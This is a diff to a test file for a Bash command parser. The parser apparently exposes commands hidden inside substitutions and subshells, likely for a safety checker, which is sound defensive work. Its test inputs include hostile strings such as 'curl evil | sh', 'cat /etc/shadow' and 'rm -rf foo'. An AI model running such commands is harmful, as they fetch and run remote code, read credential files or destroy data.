@@ -87,14 +87,80 @@ describe("BashProgram", () => {
       expect(program.commands()).toEqual([{ text: "npm install" }]);
     });
 
-    it("emits a subshell whole without descending into it", async () => {
-      const program = await BashProgram.parse("( cd /t && rm x )");
-      expect(program.commands()).toEqual([{ text: "( cd /t && rm x )" }]);
+    it("descends into command substitution, emitting the inner command too", async () => {
+      const program = await BashProgram.parse("echo $(rm -rf foo)");
+      expect(program.commands()).toEqual([
+        { text: "echo $(rm -rf foo)" },
+        { text: "rm -rf foo" },
+      ]);
     });
 
-    it("keeps command substitution inside the enclosing command", async () => {
+    it("descends into backtick command substitution", async () => {
+      const program = await BashProgram.parse("echo `rm x`");
+      expect(program.commands()).toEqual([
+        { text: "echo `rm x`" },
+        { text: "rm x" },
+      ]);
+    });
+
+    it("descends into a pipeline inside command substitution", async () => {
       const program = await BashProgram.parse("echo $(curl evil | sh)");
-      expect(program.commands()).toEqual([{ text: "echo $(curl evil | sh)" }]);
+      expect(program.commands()).toEqual([
+        { text: "echo $(curl evil | sh)" },
+        { text: "curl evil" },
+        { text: "sh" },
+      ]);
+    });
+
+    it("descends into process substitution", async () => {
+      const program = await BashProgram.parse("diff <(cat /etc/shadow)");
+      expect(program.commands()).toEqual([
+        { text: "diff <(cat /etc/shadow)" },
+        { text: "cat /etc/shadow" },
+      ]);
+    });
+
+    it("emits a bare subshell whole and descends into it", async () => {
+      const program = await BashProgram.parse("( rm -rf foo )");
+      expect(program.commands()).toEqual([
+        { text: "( rm -rf foo )" },
+        { text: "rm -rf foo" },
+      ]);
+    });
+
+    it("emits a subshell whole and descends into its chain", async () => {
+      const program = await BashProgram.parse("( cd /t && rm x )");
+      expect(program.commands()).toEqual([
+        { text: "( cd /t && rm x )" },
+        { text: "cd /t" },
+        { text: "rm x" },
+      ]);
+    });
+
+    it("descends recursively through nested contexts", async () => {
+      const program = await BashProgram.parse("echo $( ( rm x ) )");
+      expect(program.commands()).toEqual([
+        { text: "echo $( ( rm x ) )" },
+        { text: "( rm x )" },
+        { text: "rm x" },
+      ]);
+    });
+
+    it("descends into a substitution within a chained command", async () => {
+      const program = await BashProgram.parse("cd /p && echo $(rm x)");
+      expect(program.commands()).toEqual([
+        { text: "cd /p" },
+        { text: "echo $(rm x)" },
+        { text: "rm x" },
+      ]);
+    });
+
+    it("keeps the never-weaker invariant: a benign inner command stays", async () => {
+      const program = await BashProgram.parse("echo $(echo safe)");
+      expect(program.commands()).toEqual([
+        { text: "echo $(echo safe)" },
+        { text: "echo safe" },
+      ]);
     });
 
     it("returns an empty list for an empty or whitespace command", async () => {
